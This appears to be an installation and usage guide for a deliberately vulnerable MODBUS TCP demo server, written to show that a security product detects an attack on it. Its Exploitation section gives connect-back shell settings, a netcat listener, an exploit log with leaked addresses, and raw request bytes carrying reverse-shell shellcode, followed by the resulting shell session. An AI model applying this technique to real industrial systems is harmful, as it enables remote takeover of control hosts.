# Demo Target: Installation & Usage Guide

----------

# Intro

The demo target is a simple vulnerable target MODBUS TCP service which supports MODBUS coil/bit/register writing and reading and writes its internal state to files upon every new request. The service contains a trivial stack-based buffer overflow vulnerability due to a small query buffer and as such functions normally for small queries while crashing (or being exploitable) to large ones. The target serves to demonstrate a semi-realistic ICS service, compiled with our minimum security baseline, working with a protocol (MODBUS TCP) common to the target setting and is intended to be protected by our solution. The goal of the demonstration is to showcase how the attacker's exploit gets detected by our solution.

# Installation

Create a target directory eg. `/home/pi/demotarget` and save `dummyserver.c` and `logic.py` there. Download [libmodbus v3.1.2](http://libmodbus.org/releases/libmodbus-3.1.2.tar.gz) upon which our application relies and unpack to `/home/pi/demotarget/libmodbus`. Compile the library:

```bash
$ cd libmodbus
$ chmod u+x configure
$ ./configure
$ make
$ sudo make install
$ sudo cp ./src/.libs/libmodbus.so.5 /usr/lib
```

Compile the dummy server with `gcc -Bdynamic -lc -ldl -lrt -lm -lpthread -lgcc_s -lmodbus -fstack-protector-all -Wformat -Wformat-security -Wconversion -Wsign-conversion -Wl,-z,relro,-z,now -Ilibmodbus/src -o dummyserver dummyserver.c` and execute it with `./dummyserver`. Test whether it works by running `python dummyclient.py` which should calculate a modular fibonacci sequence using the dummy server. Note that the service runs on port `1502` so take that into account when configuring any network related stuff.

# Usage

Regular usage of the dummy server is as follows:

```bash
$ ./dummyserver
$ python dummyclient.py
1
1
2
3
5
8
13
21
34
55
89
144
233
377
610
987
1597
2584
4181
$ ls -la
total 52
drwxr-xr-x 3 pi pi  4096 Mar 15 16:00 .
drwxr-xr-x 7 pi pi  4096 Mar 15 01:17 ..
-rw-r--r-- 1 pi pi   500 Mar 15 21:38 coils.save
-rw-r--r-- 1 pi pi   500 Mar 15 21:38 disc.save
-rwxr-xr-x 1 pi pi 13428 Mar 15 15:57 dummyserver
-rw-r--r-- 1 pi pi  4574 Feb 16 22:58 dummyserver.c
-rw-r--r-- 1 pi pi  1000 Mar 15 21:38 hreg.save
-rw-r--r-- 1 pi pi  1000 Mar 15 21:38 ireg.save
drwxr-xr-x 8 pi pi  4096 Mar 15 15:27 libmodbus
```

Here the dummy client performs a modular fibonacci calculation and the dummy server writes its internal state to a series of save files upon each new write.

# Exploitation

A premade exploit for the demo target has been included and can be run with `python sploit.py`. It exploits a stack buffer overflow in a fully-hardened (ASLR+NX+Stack Cookies+Full RELRO) DummyModbusSVC daemon using a partial-XOP payload. The included payload includes a connect-back TCP shell on port 4919 (since our network input and output aren't bound to stdin/stdout as they are with xinetd applications and as such can't simply spawn an execve-based `/bin/sh` shell) so make sure to set the right details in `sploit.py`:

```python
# Shellcode connect-back info
connectback_ip = '192.168.0.102'
connectback_port = 0x1337
```

Also, before executing the exploit, make sure to set up a ready-and-waiting netcat listener to receive our connect-back shell:

```bash
$ nc -l -p 4919
```

Exploitation then looks as follows:

```python
(attacker view 1)
root@debian:~/ut/demotarget# python dummysploit.py 192.168.0.102 1502 192.168.0.104 4919
[+] Opening connection to 192.168.0.102 on port 1502: Done
[*] Sending infoleak request...
[+] Got stackpointer: [be895640]
[+] Got stack cookie: [52102a00]
[+] Got libc base: [b6e14000]
[*] Building ROP chain...
[*] Argument-setting gadget: [b6ee8294]
[*] Dispatcher gadget: [b6e737e4]
[*] mprotect address: [b6ee1c30]
[*] shellcode address: [be895680]
[*] Sending exploit request...
[*] Closed connection to 192.168.0.102 port 1502

(target view)
pi@raspberrypi:~/demotarget $ ./dummyserver 
The client connection from 192.168.0.104 is accepted
Waiting for a indication...
<00><01><00><00><00><06><00><03><00><00><00><06>
[00][01][00][00][00][0F][00][03][0C][BE][89][56][40][52][10][2A][00][B6][E1][40][00]
Waiting for a indication...
<00><02><00><00><00><8F><00><10><00><01><00><44><88><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><00><2A><10><52><DE><C0><AD><0B><94><82><EE><B6><00><50><89><BE><FF><0F><00><00><07><00><00><00><30><1C><EE><B6><DE><C0><AD><0B><E4><37><E7><B6><DE><C0><AD><0B><80><56><89><BE><01><10><8F><E2><11><FF><2F><E1><02><20><01><21><92><1A><0F><02><19><37><01><DF><06><1C><08><A1><10><22><02><37><01><DF><3F><27><02><21><30><1C><01><DF><01><39><FB><D5><05><A0><92><1A><05><B4><69><46><0B><27><01><DF><C0><46><02><00><13><37><C0><A8><00><68><2F><62><69><6E><2F><73><68><00><42>
[00][02][00][00][00][06][00][10][00][01][00][44]
Waiting for a indication...

(attacker view 2)
root@debian:~# nc -l -p 4919
id
uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),997(gpio),998(i2c),999(spi)
uname -a
Linux raspberrypi 4.1.17+ #838 Tue Feb 9 12:57:10 GMT 2016 armv6l GNU/Linux
```

Note that the exploit hasn't been 'weaponized' and as such might not be 100% reliable in every possible edge case. Hence, in order to prevent any 'live demo effect' hickups it is best to simply restart the dummyserver before running the exploit.
